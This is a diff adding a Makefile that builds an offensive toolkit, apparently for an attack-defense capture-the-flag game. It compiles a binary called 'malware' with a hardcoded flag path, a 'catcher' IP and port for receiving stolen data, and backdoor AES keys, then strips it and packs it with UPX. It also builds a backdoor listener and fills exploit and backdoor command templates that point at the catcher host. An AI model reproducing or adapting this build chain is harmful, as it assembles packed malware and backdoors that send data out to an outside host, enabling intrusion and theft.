@@ -1,0 +1,53 @@
+DIR=oc
+PROVIDER_IP=140.113.235.151
+PROVIDER_PORT=8877
+TMPPATH=/tmp
+TMPFILE=oc
+FLAG_PATH=/home/oc/flag
+BACKDOOR_PORT=4433
+BACKDOOR_IN_KEY=1234qwerasdfzxcv
+BACKDOOR_OUT_KEY=4321rewqfdsavcxz
+CATCHER_IP=140.113.235.151
+CATCHER_PORT=6655
+
+
+all: malware backdoorentry
+	mkdir $(DIR)
+	mv malware backdoorentry $(DIR)
+	sed 's/listen_port/$(CATCHER_PORT)/g' < catcher.py > $(DIR)/catcher.py
+	sed 's/listen_port/$(PROVIDER_PORT)/g' < provider.py > $(DIR)/provider.py
+	sed -e 's/provider_ip/$(PROVIDER_IP)/g'\
+		-e 's/provider_port/$(PROVIDER_PORT)/g'\
+		-e 's|tmpfile|$(TMPFILE)|g'\
+		-e 's|tmppath|$(TMPPATH)|g'\
+		-e 's|flag_path|$(FLAG_PATH)|g'\
+		-e 's/catch_ip/$(CATCHER_IP)/g'\
+		-e 's/catch_port/$(CATCHER_PORT)/g'\
+		 < exploitcmdtemplate > $(DIR)/exploitcmd
+	sed -e 's|flag_path|$(FLAG_PATH)|g'\
+		-e 's/catch_ip/$(CATCHER_IP)/g'\
+		-e 's/catch_port/$(CATCHER_PORT)/g'\
+		 < backdoorcmdtemplate > $(DIR)/backdoorcmd
+	cp broadcast.py backbroadcast.py $(DIR)
+	chmod +x $(DIR)/catcher.py $(DIR)/provider.py $(DIR)/broadcast.py $(DIR)/backbroadcast.py
+
+malware: mal.c
+	gcc mal.c aes.c -o malware -O2 -static\
+		-Dflag_path=\"$(FLAG_PATH)\"\
+		-Dcatch_ip=\"$(CATCHER_IP)\"\
+		-Dcatch_port=$(CATCHER_PORT)\
+		-Dbackdoor_port=$(BACKDOOR_PORT)\
+		-Dikey=\"$(BACKDOOR_IN_KEY)\"\
+		-Dokey=\"$(BACKDOOR_OUT_KEY)\"
+	strip malware
+	upx malware
+
+backdoorentry: backdoorentry.c
+	gcc backdoorentry.c aes.c -o backdoorentry \
+		-DIN_KEY=\"$(BACKDOOR_IN_KEY)\"\
+		-DOUT_KEY=\"$(BACKDOOR_OUT_KEY)\"\
+		-Dport=$(BACKDOOR_PORT)
+
+.PHONY: clean
+clean:
+	rm -rf $(DIR)
